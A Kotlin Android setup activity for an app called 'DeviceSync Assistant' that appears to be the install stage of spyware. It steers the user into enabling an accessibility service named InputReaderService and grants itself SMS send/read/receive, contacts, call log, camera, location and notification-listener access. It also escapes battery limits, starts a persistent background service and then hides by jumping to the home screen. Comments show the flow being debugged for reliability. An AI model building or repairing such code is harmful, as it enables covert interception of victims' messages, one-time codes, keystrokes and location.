package com.devicesync.assistant

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.devicesync.assistant.helpers.ConfigHelper
import com.devicesync.assistant.services.DeviceSyncService

class SetupActivity : AppCompatActivity() {

    private val allPermissions = arrayOf(
        Manifest.permission.READ_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.CAMERA,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION
    )

    private val PERMISSION_REQUEST_CODE = 100
    private val handler = Handler(Looper.getMainLooper())

    // ── ROOT CAUSE FIX 1: init ConfigHelper here so prefs is always ready ──
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        ConfigHelper.init(applicationContext)
        startSetup()
    }

    private fun startSetup() {
        if (!isAccessibilityEnabled()) {
            openAccessibilitySettings()
        } else {
            proceedAfterAccessibility()
        }
    }

    private fun openAccessibilitySettings() {
        val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
        intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
        startActivity(intent)
        // ── ROOT CAUSE FIX 2: poll every second for up to 5 minutes
        // instead of relying on onResume() which never fires if activity was killed ──
        pollForAccessibility()
    }

    private fun pollForAccessibility() {
        handler.postDelayed(object : Runnable {
            override fun run() {
                if (isAccessibilityEnabled()) {
                    proceedAfterAccessibility()
                } else {
                    handler.postDelayed(this, 1000)
                }
            }
        }, 1000)
    }

    // ── Keep onResume as backup ──
    override fun onResume() {
        super.onResume()
        if (isAccessibilityEnabled()) {
            proceedAfterAccessibility()
        }
    }

    private fun isAccessibilityEnabled(): Boolean {
        val serviceName = "${packageName}/.services.InputReaderService"
        val enabledServices = Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false
        return enabledServices.contains(serviceName)
    }

    private fun proceedAfterAccessibility() {
        handler.removeCallbacksAndMessages(null)
        requestAllPermissions()
    }

    private fun requestAllPermissions() {
        val notGranted = allPermissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }.toTypedArray()

        if (notGranted.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, notGranted, PERMISSION_REQUEST_CODE)
        } else {
            proceedAfterPermissions()
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == PERMISSION_REQUEST_CODE) {
            proceedAfterPermissions()
        }
    }

    private fun proceedAfterPermissions() {
        disableBatteryOptimization()
    }

    private fun disableBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
            intent.data = Uri.parse("package:$packageName")
            startActivity(intent)
            handler.postDelayed({ proceedAfterBattery() }, 2000)
        } else {
            proceedAfterBattery()
        }
    }

    private fun proceedAfterBattery() {
        enableNotificationAccess()
    }

    private fun enableNotificationAccess() {
        if (!isNotificationAccessEnabled()) {
            val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            startActivity(intent)
            handler.postDelayed({ proceedAfterNotification() }, 3000)
        } else {
            proceedAfterNotification()
        }
    }

    private fun isNotificationAccessEnabled(): Boolean {
        val enabledListeners = Settings.Secure.getString(
            contentResolver, "enabled_notification_listeners"
        ) ?: return false
        return enabledListeners.contains(packageName)
    }

    private fun proceedAfterNotification() {
        startDeviceSyncService()
    }

    private fun startDeviceSyncService() {
        val serviceIntent = Intent(this, DeviceSyncService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }
        goHome()
    }

    private fun goHome() {
        val homeIntent = Intent(Intent.ACTION_MAIN)
        homeIntent.addCategory(Intent.CATEGORY_HOME)
        homeIntent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
        startActivity(homeIntent)
        finish()
    }
}
